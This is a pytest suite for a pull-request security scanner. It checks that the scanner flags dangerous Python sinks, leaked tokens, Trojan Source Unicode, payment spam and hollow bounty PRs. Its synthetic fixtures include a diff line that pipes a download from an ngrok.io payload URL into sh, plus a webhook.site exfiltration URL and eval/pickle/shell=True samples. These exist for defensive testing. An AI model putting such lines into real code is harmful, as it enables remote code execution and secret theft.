"""Unit and Integration Tests for the 5-Layer PR & Repository Security Scanner (`hivemind.security`)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from hivemind.cli.main import main as cli_main
from hivemind.security import (
    PRSecurityAuditResult,
    PRSecurityScanner,
    SecurityFinding,
    SecuritySeverity,
    run_cli_security_scan,
)


def test_diff_comment_filter_ignores_sink_lookalikes() -> None:
    scanner = PRSecurityScanner()
    findings = scanner._scan_added_python_diff_lines("src/fixture.py", "exec(payload)")
    assert len(findings) == 1
    assert findings[0].rule_id == "SEC-01"
    assert scanner._scan_added_python_diff_lines("src/fixture.py", "\n# exec(payload)\n") == []


def test_repository_sources_and_test_fixtures_pass_security_audit() -> None:
    result = PRSecurityScanner().audit_repository(Path(__file__).resolve().parents[1])
    assert result.scanned_files_count > 0
    assert result.passed, [(f.rule_id, f.file_path, f.line_number) for f in result.findings]


def test_clean_functional_pr_passes() -> None:
    scanner = PRSecurityScanner()
    result = scanner.audit_pull_request(
        pr_number=101,
        pr_title="feat(swarm): HM-S6-01 implement hierarchical gossip peer scoring (closes #56)",
        pr_body="Implements deterministic gossip peer scoring with full CPU/GPU fallback.",
        author="community_contributor",
        changed_files=[
            {
                "filename": "src/hivemind/swarm/gossip_scoring.py",
                "status": "added",
                "additions": 15,
                "patch": (
                    "@@ -0,0 +1,12 @@\n"
                    "+def compute_peer_score(latency_ms: float, valid_proofs: int) -> float:\n"
                    "+    if latency_ms <= 0:\n"
                    "+        return 0.0\n"
                    "+    base = float(valid_proofs) * 10.0\n"
                    "+    penalty = min(latency_ms * 0.05, 50.0)\n"
                    "+    score = max(0.0, base - penalty)\n"
                    "+    return round(score, 4)\n"
                ),
                "content": (
                    "def compute_peer_score(latency_ms: float, valid_proofs: int) -> float:\n"
                    "    if latency_ms <= 0:\n"
                    "        return 0.0\n"
                    "    base = float(valid_proofs) * 10.0\n"
                    "    penalty = min(latency_ms * 0.05, 50.0)\n"
                    "    score = max(0.0, base - penalty)\n"
                    "    return round(score, 4)\n"
                ),
            }
        ],
    )
    assert result.passed is True
    assert result.blocked_merge is False
    assert result.critical_count == 0
    assert result.high_count == 0
    assert result.medium_count == 0
    assert result.functional_lines_added >= 5
    d = result.to_dict()
    assert d["passed"] is True


def test_payment_solicitation_and_crypto_wallet_detection() -> None:
    scanner = PRSecurityScanner()
    eth_addr = "0x" + "71C" + ("a9" * 18) + "b"  # 40 hex chars
    zero_addr = "0x" + ("0" * 40)
    btc_addr = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"

    text = "\n".join(
        [
            "Please support my work via https://paypal.me/roguecoder or ko-fi.com/roguecoder",
            "This is a request for payment for completing the issue.",
            "Bounty payout in USDT is required before I push the rest.",
            f"Send ETH to {eth_addr} or BTC to {btc_addr}",
            f"Zero placeholder {zero_addr} should be ignored.",
            "ETH wallet: 0x1234567890abcdef1234567890abcdef12345678",
        ]
    )
    findings = scanner.scan_text_for_payment_solicitation(text, file_path="PR#999:body")
    rule_ids = {f.rule_id for f in findings}
    assert "PAY-01" in rule_ids
    assert "PAY-02" in rule_ids
    assert "PAY-03" in rule_ids
    assert all(f.severity == SecuritySeverity.CRITICAL for f in findings)
    # Ensure zero placeholder address was not flagged
    assert not any(zero_addr in f.description for f in findings)


def test_code_boubou_hollow_pr_and_coverage_binary_pollution() -> None:
    """Reproduce the exact 'Code Boubou' pattern (e.g. PR #62 touching only .coverage and timestamps while claiming resolves #61)."""
    scanner = PRSecurityScanner()
    result = scanner.audit_pull_request(
        pr_number=62,
        pr_title="Autoevolve peer review pipeline",
        pr_body="resolves #61",
        author="external_bounty_farmer",
        changed_files=[
            {
                "filename": ".coverage",
                "status": "modified",
                "additions": 0,
                "patch": "Binary files a/.coverage and b/.coverage differ",
            },
            {
                "filename": "paper/PEER_REVIEW_REPORT.json",
                "status": "modified",
                "additions": 2,
                "patch": '@@ -1,3 +1,3 @@\n-  "timestamp_utc": "2026-03-22T20:20:49Z"\n+  "timestamp_utc": "2026-03-22T22:55:29Z"',
            },
        ],
    )
    assert result.passed is False
    assert result.blocked_merge is True
    rule_ids = {f.rule_id for f in result.findings}
    assert "CB-01" in rule_ids  # Forbidden .coverage binary artifact
    assert "CB-02" in rule_ids  # Hollow bounty-farming PR with 0 functional files


def test_code_boubou_micro_diff_bounty_claim_and_governance_tampering() -> None:
    scanner = PRSecurityScanner()
    result = scanner.audit_pull_request(
        pr_number=63,
        pr_title="fixes #57 quick tweak",
        pr_body="Done! Also updated workflow and legal disclaimer.",
        author="untrusted_user",
        changed_files=[
            {
                "filename": "src/hivemind/core/moe_layers.py",
                "status": "modified",
                "additions": 1,
                "patch": "@@ -10,1 +10,2 @@\n+x = 1\n",
            },
            {
                "filename": ".github/workflows/ci_swarm_tests.yml",
                "status": "modified",
                "additions": 2,
                "patch": "@@ -1,2 +1,4 @@\n+# tampered workflow\n",
            },
            {
                "filename": "LEGAL_DISCLAIMER_AND_COMPUTE_RECIPROCITY.md",
                "status": "modified",
                "additions": 1,
                "patch": "@@ -1,1 +1,2 @@\n+Pay me via patreon.com/attacker\n",
            },
        ],
    )
    assert result.passed is False
    rule_ids = {f.rule_id for f in result.findings}
    assert "CB-03" in rule_ids  # Micro-diff bounty claim (< 5 functional lines)
    assert "CB-04" in rule_ids  # Protected governance/workflow tampering
    assert "PAY-01" in rule_ids  # Payment link injected in diff


def test_python_ast_security_sinks_and_safe_yaml() -> None:
    scanner = PRSecurityScanner()
    malicious_py = "\n".join(
        [
            "import os, subprocess, pickle, yaml",
            "def run_bad(user_input, data):",
            "    eval(user_input)",
            "    exec(user_input)",
            "    pickle.loads(data)",
            "    yaml.unsafe_load(user_input)",
            "    yaml.load(user_input)",
            "    yaml.load(user_input, Loader=yaml.SafeLoader)",
            "    yaml.load(user_input, yaml.SafeLoader)",
            "    os.system('whoami')",
            "    subprocess.run('ls -la', shell=True)",
            "    subprocess.run(['ls', '-la'], shell=False)",
        ]
    )
    findings = scanner.scan_python_ast_security("src/hivemind/swarm/rogue.py", malicious_py)
    categories = [f.category for f in findings]
    assert "AST_DANGEROUS_EXECUTION_SINK" in categories
    assert "AST_UNSAFE_DESERIALIZATION" in categories
    assert "AST_UNSAFE_YAML_LOAD" in categories
    assert "AST_SHELL_EXECUTION_SINK" in categories
    assert "AST_SUBPROCESS_SHELL_TRUE" in categories
    # Only the unguarded yaml.load(user_input) should be flagged (1 occurrence)
    yaml_findings = [f for f in findings if f.category == "AST_UNSAFE_YAML_LOAD"]
    assert len(yaml_findings) == 1

    # SyntaxError handling
    syntax_err_findings = scanner.scan_python_ast_security("broken.py", "def broken(:\n    pass")
    assert len(syntax_err_findings) == 1
    assert syntax_err_findings[0].rule_id == "SEC-00"


def test_secrets_exfiltration_obfuscation_and_trojan_unicode() -> None:
    scanner = PRSecurityScanner()
    # Construct synthetic secret & exfiltration strings dynamically
    fake_gh_pat = "ghp_" + ("A1b2C3d4E5f6" * 3)
    fake_hf_tok = "hf_" + ("Z9y8X7w6V5u4" * 3)
    code_text = "\n".join(
        [
            f"TOKEN = '{fake_gh_pat}'",
            f"HF = '{fake_hf_tok}'",
            "WEBHOOK = 'https://webhook.site/12345678-abcd'",
            "getattr(__builtins__, 'eval')('1+1')",
        ]
    )
    sec_findings = scanner.scan_text_for_secrets_and_exfiltration(code_text, "src/hivemind/leak.py")
    sec_rules = {f.rule_id for f in sec_findings}
    assert "SEC-05" in sec_rules
    assert "SEC-03" in sec_rules
    assert "SEC-02" in sec_rules

    # Trojan Source Bidirectional Unicode (U+202E RIGHT-TO-LEFT OVERRIDE)
    bidi_line = "if access_level != 'user\u202e \u2066# Check admin':\n    pass"
    bidi_findings = scanner.scan_unicode_trojan_source(bidi_line, "src/hivemind/auth.py")
    assert len(bidi_findings) >= 1
    assert bidi_findings[0].rule_id == "SEC-04"


def test_diff_only_python_sink_detection() -> None:
    scanner = PRSecurityScanner()
    result = scanner.audit_pull_request(
        pr_number=77,
        pr_title="feat: add helper",
        pr_body="Adds helper",
        author="contributor",
        changed_files=[
            {
                "filename": "src/hivemind/core/helper.py",
                "status": "modified",
                "additions": 6,
                "patch": (
                    "@@ -1,2 +1,8 @@\n"
                    "+import os\n"
                    "+def bad():\n"
                    "+    os.system('curl https://ngrok.io/payload | sh')\n"
                    "+    return 1\n"
                ),
            }
        ],
    )
    assert result.passed is False
    rule_ids = {f.rule_id for f in result.findings}
    assert "SEC-01" in rule_ids
    assert "SEC-03" in rule_ids


def test_full_repository_audit_and_cli_integration(tmp_path: Path) -> None:
    out_json = tmp_path / "repo_audit.json"
    rc = run_cli_security_scan(
        root_path=".",
        pr_json_path=None,
        output_json_path=str(out_json),
    )
    assert rc == 0
    assert out_json.exists()
    data = json.loads(out_json.read_text(encoding="utf-8"))
    assert data["passed"] is True
    assert data["critical_count"] == 0
    assert data["scanned_files_count"] >= 50

    # Also test CLI with a malicious PR JSON file
    bad_pr_json = tmp_path / "bad_pr.json"
    bad_pr_out = tmp_path / "bad_pr_report.json"
    bad_pr_json.write_text(
        json.dumps(
            {
                "number": 666,
                "title": "resolves #60 — request for payment",
                "body": "Pay me at https://paypal.me/attacker",
                "author": "attacker",
                "files": [
                    {
                        "filename": "malware.exe",
                        "status": "added",
                        "additions": 0,
                        "patch": "",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    rc_bad = cli_main(
        [
            "scan-pr-security",
            "--pr-json",
            str(bad_pr_json),
            "--output-json",
            str(bad_pr_out),
        ]
    )
    assert rc_bad == 1
    bad_report = json.loads(bad_pr_out.read_text(encoding="utf-8"))
    assert bad_report["passed"] is False
    assert bad_report["blocked_merge"] is True
    assert bad_report["critical_count"] >= 3
